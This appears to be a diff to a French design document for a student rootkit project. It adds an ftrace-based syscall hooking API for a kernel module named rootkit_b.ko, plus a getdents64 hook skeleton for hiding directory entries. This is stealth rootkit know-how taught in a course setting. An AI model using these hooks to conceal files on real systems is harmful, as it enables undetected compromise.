@@ -60,6 +60,58 @@ Codes de statut (`cmd_response.status`) :
 | `CMD_STATUS_ERR`    | `1`    | commande reconnue mais échouée         |
 | `CMD_STATUS_UNKNOWN`| `2`    | identifiant de commande non reconnu    |
 
+## Framework de remplacement de syscall (pour C)
+
+Second livrable de B : un framework de hook générique basé sur **ftrace**
+(conforme au TP03 — pas de modification directe de `sys_call_table`, pas de
+patch du bit WP de CR0). C l'utilise pour installer ses hooks de furtivité.
+
+API publique (`include/syscall_hook.h`) :
+
+```c
+struct ftrace_hook {
+	const char *name;      /* symbole à remplacer, ex. "__x64_sys_getdents64" */
+	void *function;        /* fonction de remplacement                        */
+	void *original;        /* &(pointeur original) -> rempli à l'install      */
+	/* address / ops : internes, remplis par fh_install_hooks()               */
+};
+
+#define HOOK(name, function, original) /* initialiseur de table */
+
+int  fh_install_hooks(struct ftrace_hook *hooks, size_t count);
+void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);
+```
+
+Côté C, le schéma d'usage (exemple `getdents64`) :
+
+```c
+static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
+
+static asmlinkage long hook_getdents64(const struct pt_regs *regs)
+{
+	long ret = orig_getdents64(regs);   /* appel de l'original */
+	/* ... filtrage du buffer linux_dirent64 pour masquer une entrée ... */
+	return ret;
+}
+
+static struct ftrace_hook c_hooks[] = {
+	HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
+};
+/* à l'init : fh_install_hooks(c_hooks, ARRAY_SIZE(c_hooks));  (goto cascade) */
+/* à l'exit : fh_remove_hooks(c_hooks, ARRAY_SIZE(c_hooks));                  */
+```
+
+Règles d'usage :
+
+- `fh_install_hooks` est **tout-ou-rien** : en cas d'échec, les hooks déjà
+  posés par l'appel sont retirés avant le retour. Toujours vérifier le retour.
+- La fonction de remplacement doit appeler l'original via le pointeur
+  `original` pour le comportement normal (la garde anti-récursion le gère).
+- **Interdit de hooker `kill`** (contrainte sujet).
+
+Config noyau requise sur la cible : `CONFIG_KPROBES`, `CONFIG_FUNCTION_TRACER`,
+`CONFIG_DYNAMIC_FTRACE`, `CONFIG_DYNAMIC_FTRACE_WITH_REGS`, `CONFIG_KALLSYMS`.
+
 ## Règles de stabilité (figé à J1)
 
 Ne changera plus après J1 :
@@ -84,8 +136,10 @@ Peut encore évoluer après J1 :
 - Un module unique `rootkit_b.ko` au cycle de vie propre
   (`init`/`exit` symétriques), sur lequel poser les hooks.
 - Un canal de commande stable servant de point d'ancrage.
+- Le **framework de hook ftrace** (`fh_install_hooks` / `fh_remove_hooks`,
+  voir section dédiée) pour poser ses hooks de furtivité.
 - Aucun hook de l'appel système `kill` côté B (contrainte sujet) : C garde
-  la main sur le choix des appels système remplacés.
+  la main sur le choix des appels système remplacés (sauf `kill`).
 
 **Ce que D attend de B :**
 
